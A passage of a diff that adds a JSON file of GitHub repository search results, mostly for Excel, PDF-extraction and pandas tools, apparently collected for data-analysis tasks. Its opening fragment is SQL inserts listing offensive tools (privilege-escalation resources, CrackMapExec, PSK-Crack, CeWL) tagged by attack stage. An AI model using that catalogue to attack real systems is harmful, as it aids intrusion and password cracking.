Features, Target, Offensive, commands) VALUES ('Linux commands', 'Post', 'Linux commands used for Priv esc', 'https://gtfobins.github.io, https://wadcoms.github.io', 'Priv Esc', 'Linux', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('CrackMapExec', 'Enum,, Exploit', 'Swis army knife of network testing', 'https://ptestmethod.readthedocs.io/en/latest/cme.html', 'Scanning, Exploit', 'Networks', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('IKE-Scan', 'Enum', 'Used to dicover, fingerprint and test IPsec VPN systems', 'http://www.nta-monitor.com/wiki/index.php/Ike-scan_User_Guide', 'Scanning', 'VPN', NULL, NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('PSK-Crack', 'Exploit', 'attempts to crack IKE Aggressive Mode pre-shared keys that have previously been gathered using ike-scan with the --pskcrack option', 'https://linux.die.net/man/1/psk-crack', 'Connect, Brute', 'Wifi', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('CeWL', 'Enum', 'spiders a given url returning a wordlist that is intednded for cracking passwords', 'https://tools.kali.org/password-attacks/cewl', 'Brute', 'Web', 'Y', NULL);  COMMIT TRANSACTION; PRAGMA foreign_keys = on;",
+        "stars": 129,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "sales-pivot-analysis",
+      "query_id": "sales-pivot-analysis::skill_neighbor::03",
+      "query_text": "pdf table extraction python",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "Baskar-forever/TableExtractor-Advanced-PDF-Table-Extraction",
+      "url": "https://github.com/Baskar-forever/TableExtractor-Advanced-PDF-Table-Extraction",
+      "domain": "github.com",
+      "score_hint": 1.009,
+      "metadata": {
+        "repo_full_name": "Baskar-forever/TableExtractor-Advanced-PDF-Table-Extraction",
+        "description": "PDF Table Extractor is an innovative Python project designed to tackle the challenge of extracting tables from scanned PDF documents. Leveraging advanced optical character recognition (OCR) and image processing techniques.",
+        "stars": 43,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "sales-pivot-analysis",
+      "query_id": "sales-pivot-analysis::skill_neighbor::03",
+      "query_text": "pdf table extraction python",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "BobLd/camelot-sharp",
+      "url": "https://github.com/BobLd/camelot-sharp",
+      "domain": "github.com",
+      "score_hint": 1.007,
+      "metadata": {
+        "repo_full_name": "BobLd/camelot-sharp",
+        "description": "A C# library to extract tabular data from PDFs (port of camelot Python version using PdfPig).",
+        "stars": 35,
+        "default_branch": "master"
+      }
+    },
+    {
+      "task_id": "sales-pivot-analysis",
+      "query_id": "sales-pivot-analysis::skill_neighbor::03",
+      "query_text": "pdf table extraction python",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "pdfliberation/pdf_table_extraction",
+      "url": "https://github.com/pdfliberation/pdf_table_extraction",
+      "domain": "github.com",
+      "score_hint": 1.002,
+      "metadata": {
+        "repo_full_name": "pdfliberation/pdf_table_extraction",
+        "description": "experimenting with pdf2text and python pdf-table-extract",
+        "stars": 11,
+        "default_branch": "master"
+      }
+    },
+    {
+      "task_id": "sales-pivot-analysis",
+      "query_id": "sales-pivot-analysis::skill_neighbor::05",
+      "query_text": "document extraction structured output",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "JuniverseCoder/MinerU2PPT",
+      "url": "https://github.com/JuniverseCoder/MinerU2PPT",
+      "domain": "github.com",
+      "score_hint": 1.027,
+      "metadata": {
+        "repo_full_name": "JuniverseCoder/MinerU2PPT",
+        "description": "High-fidelity tool to convert PDF files and images into fully editable PowerPoint presentations (.pptx). Unlike basic converters, it uses AI-powered structure extraction (MinerU) to accurately reconstruct text, layouts, and images, ensuring the output is not just a screenshot but a professional, modifiable document.",
+        "stars": 137,
+        "default_branch": "master"
+      }
+    },
+    {
+      "task_id": "sales-pivot-analysis",
+      "query_id": "sales-pivot-analysis::skill_neighbor::05",
+      "query_text": "document extraction structured output",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "Tanguy9862/Medical-OCR-Data-Extraction",
+      "url": "https://github.com/Tanguy9862/Medical-OCR-Data-Extraction",
+      "domain": "github.com",
+      "score_hint": 1.002,
+      "metadata": {
+        "repo_full_name": "Tanguy9862/Medical-OCR-Data-Extraction",
+        "description": "An object-oriented Python script for extracting structured data from medical documents. Successfully processed 2,000+ files, combining OCR technology to output clean datasets for analytics. Includes collaboration with medical professionals and statistical analysis via RMarkdown.",
+        "stars": 9,
+        "default_branch": "master"
+      }
+    },
+    {
+      "task_id": "sales-pivot-analysis",
+      "query_id": "sales-pivot-analysis::skill_neighbor::05",
+      "query_text": "document extraction structured output",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "WeiKangda/pdf-ocr-processor",
+      "url": "https://github.com/WeiKangda/pdf-ocr-processor",
+      "domain": "github.com",
+      "score_hint": 1.001,
+      "metadata": {
+        "repo_full_name": "WeiKangda/pdf-ocr-processor",
+        "description": "A powerful PDF processing tool that uses Mistral AI's OCR capabilities to extract text and images from PDF documents. Features include batch processing, automatic PDF splitting for large files, and organized output structure. Perfect for document digitization and content extraction.",
+        "stars": 4,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "sales-pivot-analysis",
+      "query_id": "sales-pivot-analysis::skill_neighbor::05",
+      "query_text": "document extraction structured output",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "bettercallmanav/resume-builder-skill",
+      "url": "https://github.com/bettercallmanav/resume-builder-skill",
+      "domain": "github.com",
+      "score_hint": 1.001,
+      "metadata": {
+        "repo_full_name": "bettercallmanav/resume-builder-skill",
+        "description": "AI skill that builds professional resumes through a structured career consulting conversation with honest feedback, real metric extraction, and polished document output.",
+        "stars": 4,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "sales-pivot-analysis",
+      "query_id": "sales-pivot-analysis::skill_neighbor::05",
+      "query_text": "document extraction structured output",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "neurotatarlar/gemini-pdf-extractor",
+      "url": "https://github.com/neurotatarlar/gemini-pdf-extractor",
+      "domain": "github.com",
+      "score_hint": 1.001,
+      "metadata": {
+        "repo_full_name": "neurotatarlar/gemini-pdf-extractor",
+        "description": "Automated extraction of structured data from Tatar-language PDF documents using Google Gemini and Yandex Disk public links. Supports chunked processing, prompt engineering, and JSON output validation.",
+        "stars": 5,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "sales-pivot-analysis",
+      "query_id": "sales-pivot-analysis::skill_neighbor::06",
+      "query_text": "openpyxl excel workflow",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "RayCarterLab/ExcelAlchemy",
+      "url": "https://github.com/RayCarterLab/ExcelAlchemy",
+      "domain": "github.com",
+      "score_hint": 1.002,
+      "metadata": {
+        "repo_full_name": "RayCarterLab/ExcelAlchemy",
+        "description": "Schema-driven Python library for typed Excel import/export workflows with Pydantic, locale-aware workbooks, pluggable storage, and contract-tested architecture.",
+        "stars": 10,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "sales-pivot-analysis",
+      "query_id": "sales-pivot-analysis::skill_neighbor::06",
+      "query_text": "openpyxl excel workflow",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "bassem-elsodany/mcp_excel_server",
+      "url": "https://github.com/bassem-elsodany/mcp_excel_server",
+      "domain": "github.com",
+      "score_hint": 1.001,
+      "metadata": {
+        "repo_full_name": "bassem-elsodany/mcp_excel_server",
+        "description": "MCP Excel Server — A Python-based Model Context Protocol (MCP) server using openpyxl to enable LLMs and agents to interact with Excel files: create workbooks, read/write sheets and cell ranges, apply formulas, take screenshots (Windows), and more. Features fully automatic tool registration via decorators and seamless integration with AI workflows",
+        "stars": 3,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "sales-pivot-analysis",
+      "query_id": "sales-pivot-analysis::skill_neighbor::06",
+      "query_text": "openpyxl excel workflow",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "RazaAli313/Automating-Excel-WorkFlows-Using-Python",
+      "url": "https://github.com/RazaAli313/Automating-Excel-WorkFlows-Using-Python",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "RazaAli313/Automating-Excel-WorkFlows-Using-Python",
+        "description": "A simple Excel workflow automation script using openpyxl to process spreadsheets. It updates a column's values, adds a bar chart, and saves the modified file.",
+        "stars": 1,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "sales-pivot-analysis",
+      "query_id": "sales-pivot-analysis::skill_neighbor::06",
+      "query_text": "openpyxl excel workflow",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "a-sehic-dev/seo-automation-tool",
+      "url": "https://github.com/a-sehic-dev/seo-automation-tool",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "a-sehic-dev/seo-automation-tool",
+        "description": "Production-ready Python GUI SEO automation tool for structured Excel workflows, data processing, and automated export using pandas and openpyxl.",
+        "stars": 1,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "sales-pivot-analysis",
+      "query_id": "sales-pivot-analysis::skill_neighbor::06",
+      "query_text": "openpyxl excel workflow",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "aring87/Software-List-Management",
+      "url": "https://github.com/aring87/Software-List-Management",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "aring87/Software-List-Management",
+        "description": "Python app for searching an Excel software list and supporting request/approval workflows. Includes demo sample spreadsheet.",
+        "stars": 1,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "sales-pivot-analysis",
+      "query_id": "sales-pivot-analysis::skill_neighbor::07",
+      "query_text": "pandas excel validation",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "rogers-cyber/SmartExcelGuardian",
+      "url": "https://github.com/rogers-cyber/SmartExcelGuardian",
+      "domain": "github.com",
+      "score_hint": 1.001,
+      "metadata": {
+        "repo_full_name": "rogers-cyber/SmartExcelGuardian",
+        "description": "SmartExcelGuardian is a professional Python desktop application for Excel data cleanup, validation, and auditing. It automatically detects missing values, duplicates, type issues, and invalid formulas, applies heuristic scoring, conditional formatting, and auto-calculated Excel formulas, and export",
+        "stars": 3,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "sales-pivot-analysis",
+      "query_id": "sales-pivot-analysis::skill_neighbor::07",
+      "query_text": "pandas excel validation",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "AugustoNP/Historico-Faturamento_project",
+      "url": "https://github.com/AugustoNP/Historico-Faturamento_project",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "AugustoNP/Historico-Faturamento_project",
+        "description": "Python Excel-based billing history manager — consolidates, validates, and standardizes financial data for multiple units.",
+        "stars": 1,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "sales-pivot-analysis",
+      "query_id": "sales-pivot-analysis::skill_neighbor::07",
+      "query_text": "pandas excel validation",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "ChennaGopikaPurnima/data_automation_project",
+      "url": "https://github.com/ChennaGopikaPurnima/data_automation_project",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "ChennaGopikaPurnima/data_automation_project",
+        "description": "Automating data cleaning, validation,pivot generation using Python, Pandas & Excel",
+        "stars": 1,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "sales-pivot-analysis",
+      "query_id": "sales-pivot-analysis::skill_neighbor::07",
+      "query_text": "pandas excel validation",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "IamRakibAhmed/linkedin-voucher-checker",
+      "url": "https://github.com/IamRakibAhmed/linkedin-voucher-checker",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "IamRakibAhmed/linkedin-voucher-checker",
+        "description": "Automates LinkedIn Subscription Voucher URL validation using Python Selenium. Logs in to LinkedIn, checks URL status for \"Offer unavailable\" or \"Something went wrong,\" dynamically updates the input Excel file, and logs results. Integrates with Pandas and OpenPyXL for seamless data handling. Perfect for scalable URL validation tasks.",
+        "stars": 1,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "sales-pivot-analysis",
+      "query_id": "sales-pivot-analysis::skill_neighbor::07",
+      "query_text": "pandas excel validation",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "fy-labs/md-spreadsheet-parser",
+      "url": "https://github.com/fy-labs/md-spreadsheet-parser",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "fy-labs/md-spreadsheet-parser",
+        "description": "A Markdown table parser for Python & Node.js. A robust, zero-dependency library for parsing, validating, and manipulating Markdown tables, including conversion from Excel to Markdown.",
+        "stars": 2,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "weighted-gdp-calc",
+      "query_id": "weighted-gdp-calc::family_core::02",
+      "query_text": "pandas excel analysis workflow",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "JyotiradityaDuarah/Python-Exploratory-Analytics",
+      "url": "https://github.com/JyotiradityaDuarah/Python-Exploratory-Analytics",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "JyotiradityaDuarah/Python-Exploratory-Analytics",
+        "description": "This project contains a complete exploratory data analysis workflow implemented in a Jupyter Notebook and rendered as Assignment.html. The analysis involves loading data, cleaning it, performing descriptive statistics, visualizing patterns, and deriving meaningful insights using Python.",
+        "stars": 1,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "weighted-gdp-calc",
+      "query_id": "weighted-gdp-calc::family_core::02",
+      "query_text": "pandas excel analysis workflow",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "Rohitpandey08/automated-data-cleaning-pipeline",
+      "url": "https://github.com/Rohitpandey08/automated-data-cleaning-pipeline",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "Rohitpandey08/automated-data-cleaning-pipeline",
+        "description": "Automated data cleaning pipeline built with Python and Pandas that processes Excel and CSV files, standardizes schemas, validates required columns, and generates analysis-ready datasets through a CLI-based workflow.",
+        "stars": 1,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "weighted-gdp-calc",
+      "query_id": "weighted-gdp-calc::family_core::02",
+      "query_text": "pandas excel analysis workflow",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "Samiul1947/google-adwords-performance-analysis",
+      "url": "https://github.com/Samiul1947/google-adwords-performance-analysis",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "Samiul1947/google-adwords-performance-analysis",
+        "description": "An end-to-end Google AdWords performance analytics pipeline using Excel, Python (pandas, numpy), SQL (MySQL), and Power BI. Transforms raw ad data into actionable insights through data cleaning, transformation, relational modeling, and interactive dashboards, simulating a real-world ETL and Business Intelligence workflow.",
+        "stars": 1,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "weighted-gdp-calc",
+      "query_id": "weighted-gdp-calc::family_core::02",
+      "query_text": "pandas excel analysis workflow",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "hcibikci/Python-Automation-Fatigue-Data-Analysis",
+      "url": "https://github.com/hcibikci/Python-Automation-Fatigue-Data-Analysis",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "hcibikci/Python-Automation-Fatigue-Data-Analysis",
+        "description": "Automating Miner's Rule damage calculation using Pandas & NumPy to replace manual Excel workflows.",
+        "stars": 0,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "weighted-gdp-calc",
+      "query_id": "weighted-gdp-calc::family_core::02",
+      "query_text": "pandas excel analysis workflow",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "shourba1/Tourism-Data-Analysis-Project",
+      "url": "https://github.com/shourba1/Tourism-Data-Analysis-Project",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "shourba1/Tourism-Data-Analysis-Project",
+        "description": "Full data analysis workflow applied to a real tourism dataset — including Python cleaning & EDA, Excel business analysis (10 pivot insights), an interactive Power BI dashboard, and SQL analytical queries. Demonstrates end-to-end analytical skills and the ability to extract actionable insights from raw data.",
+        "stars": 1,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "weighted-gdp-calc",
+      "query_id": "weighted-gdp-calc::family_core::03",
+      "query_text": "spreadsheet validation workflow python",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "SakshiKhanore/Sales-Dashboard-Excel",
+      "url": "https://github.com/SakshiKhanore/Sales-Dashboard-Excel",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "SakshiKhanore/Sales-Dashboard-Excel",
+        "description": "This repo contains files demonstrating data cleaning, filtering, and aggregation on a sales dataset using Excel and Python (Pandas) to compute revenue metrics by month, gender, and product category. Analyzed sales trends and validated insights across spreadsheet-based and programmatic workflows using Excel dashboards and Python-based summaries.",
+        "stars": 0,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "weighted-gdp-calc",
+      "query_id": "weighted-gdp-calc::family_core::03",
+      "query_text": "spreadsheet validation workflow python",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "VuppalaYashwanth/Python-Automation-Tool-for-CSV-Validation-Cleaning-Report-Generation",
+      "url": "https://github.com/VuppalaYashwanth/Python-Automation-Tool-for-CSV-Validation-Cleaning-Report-Generation",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "VuppalaYashwanth/Python-Automation-Tool-for-CSV-Validation-Cleaning-Report-Generation",
+        "description": "This project is a Python-based automation tool designed to improve the reliability of recurring CSV and spreadsheet-based reporting workflows. It validates dataset structure, cleans inconsistent data, and produces standardized outputs along with summary reports.",
+        "stars": 1,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "weighted-gdp-calc",
+      "query_id": "weighted-gdp-calc::family_specific::08",
+      "query_text": "pivot table workflow openpyxl",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "ferjencoder/04-automate-python",
+      "url": "https://github.com/ferjencoder/04-automate-python",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "ferjencoder/04-automate-python",
+        "description": "Automate Excel Report Generation  A Python utility that simplifies the data analysis process by automatically creating pivot tables and generating bar charts from Excel files. Streamline your reporting workflow with a tool designed for efficiency and ease of use, saving time and ensuring accuracy in your Excel-based reports.",
+        "stars": 0,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "weighted-gdp-calc",
+      "query_id": "weighted-gdp-calc::family_specific::08",
+      "query_text": "pivot table workflow openpyxl",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "roannelafuente/CSV-Workflow-Automation-v1.0.0",
+      "url": "https://github.com/roannelafuente/CSV-Workflow-Automation-v1.0.0",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "roannelafuente/CSV-Workflow-Automation-v1.0.0",
+        "description": "Automates .csv workflow by converting CSVs to Excel, generating pivot tables, validating End Test numbers, and creating wafermap visualizations for yield and defect tracking. Built with Python, Tkinter, OpenPyXL, and xlwings, it streamlines workflows and ensures reproducible, audit‑ready insights",
+        "stars": 0,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "weighted-gdp-calc",
+      "query_id": "weighted-gdp-calc::skill_neighbor::04",
+      "query_text": "openpyxl excel workflow",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "RayCarterLab/ExcelAlchemy",
+      "url": "https://github.com/RayCarterLab/ExcelAlchemy",
+      "domain": "github.com",
+      "score_hint": 1.002,
+      "metadata": {
+        "repo_full_name": "RayCarterLab/ExcelAlchemy",
+        "description": "Schema-driven Python library for typed Excel import/export workflows with Pydantic, locale-aware workbooks, pluggable storage, and contract-tested architecture.",
+        "stars": 10,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "weighted-gdp-calc",
+      "query_id": "weighted-gdp-calc::skill_neighbor::04",
+      "query_text": "openpyxl excel workflow",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "bassem-elsodany/mcp_excel_server",
+      "url": "https://github.com/bassem-elsodany/mcp_excel_server",
+      "domain": "github.com",
+      "score_hint": 1.001,
+      "metadata": {
+        "repo_full_name": "bassem-elsodany/mcp_excel_server",
+        "description": "MCP Excel Server — A Python-based Model Context Protocol (MCP) server using openpyxl to enable LLMs and agents to interact with Excel files: create workbooks, read/write sheets and cell ranges, apply formulas, take screenshots (Windows), and more. Features fully automatic tool registration via decorators and seamless integration with AI workflows",
+        "stars": 3,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "weighted-gdp-calc",
+      "query_id": "weighted-gdp-calc::skill_neighbor::04",
+      "query_text": "openpyxl excel workflow",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "RazaAli313/Automating-Excel-WorkFlows-Using-Python",
+      "url": "https://github.com/RazaAli313/Automating-Excel-WorkFlows-Using-Python",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "RazaAli313/Automating-Excel-WorkFlows-Using-Python",
+        "description": "A simple Excel workflow automation script using openpyxl to process spreadsheets. It updates a column's values, adds a bar chart, and saves the modified file.",
+        "stars": 1,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "weighted-gdp-calc",
+      "query_id": "weighted-gdp-calc::skill_neighbor::04",
+      "query_text": "openpyxl excel workflow",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "a-sehic-dev/seo-automation-tool",
+      "url": "https://github.com/a-sehic-dev/seo-automation-tool",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "a-sehic-dev/seo-automation-tool",
+        "description": "Production-ready Python GUI SEO automation tool for structured Excel workflows, data processing, and automated export using pandas and openpyxl.",
+        "stars": 1,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "weighted-gdp-calc",
+      "query_id": "weighted-gdp-calc::skill_neighbor::04",
+      "query_text": "openpyxl excel workflow",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "aring87/Software-List-Management",
+      "url": "https://github.com/aring87/Software-List-Management",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "aring87/Software-List-Management",
+        "description": "Python app for searching an Excel software list and supporting request/approval workflows. Includes demo sample spreadsheet.",
+        "stars": 1,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "weighted-gdp-calc",
+      "query_id": "weighted-gdp-calc::skill_neighbor::05",
+      "query_text": "pandas excel validation",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "rogers-cyber/SmartExcelGuardian",
+      "url": "https://github.com/rogers-cyber/SmartExcelGuardian",
+      "domain": "github.com",
+      "score_hint": 1.001,
+      "metadata": {
+        "repo_full_name": "rogers-cyber/SmartExcelGuardian",
+        "description": "SmartExcelGuardian is a professional Python desktop application for Excel data cleanup, validation, and auditing. It automatically detects missing values, duplicates, type issues, and invalid formulas, applies heuristic scoring, conditional formatting, and auto-calculated Excel formulas, and export",
+        "stars": 3,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "weighted-gdp-calc",
+      "query_id": "weighted-gdp-calc::skill_neighbor::05",
+      "query_text": "pandas excel validation",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "AugustoNP/Historico-Faturamento_project",
+      "url": "https://github.com/AugustoNP/Historico-Faturamento_project",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "AugustoNP/Historico-Faturamento_project",
+        "description": "Python Excel-based billing history manager — consolidates, validates, and standardizes financial data for multiple units.",
+        "stars": 1,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "weighted-gdp-calc",
+      "query_id": "weighted-gdp-calc::skill_neighbor::05",
+      "query_text": "pandas excel validation",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "ChennaGopikaPurnima/data_automation_project",
+      "url": "https://github.com/ChennaGopikaPurnima/data_automation_project",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "ChennaGopikaPurnima/data_automation_project",
+        "description": "Automating data cleaning, validation,pivot generation using Python, Pandas & Excel",
+        "stars": 1,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "weighted-gdp-calc",
+      "query_id": "weighted-gdp-calc::skill_neighbor::05",
+      "query_text": "pandas excel validation",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "IamRakibAhmed/linkedin-voucher-checker",
+      "url": "https://github.com/IamRakibAhmed/linkedin-voucher-checker",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "IamRakibAhmed/linkedin-voucher-checker",
+        "description": "Automates LinkedIn Subscription Voucher URL validation using Python Selenium. Logs in to LinkedIn, checks URL status for \"Offer unavailable\" or \"Something went wrong,\" dynamically updates the input Excel file, and logs results. Integrates with Pandas and OpenPyXL for seamless data handling. Perfect for scalable URL validation tasks.",
+        "stars": 1,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "weighted-gdp-calc",
+      "query_id": "weighted-gdp-calc::skill_neighbor::05",
+      "query_text": "pandas excel validation",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "fy-labs/md-spreadsheet-parser",
+      "url": "https://github.com/fy-labs/md-spreadsheet-parser",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "fy-labs/md-spreadsheet-parser",
+        "description": "A Markdown table parser for Python & Node.js. A robust, zero-dependency library for parsing, validating, and manipulating Markdown tables, including conversion from Excel to Markdown.",
+        "stars": 2,
+        "default_branch": "main"
+      }
+    }
+  ]
+}
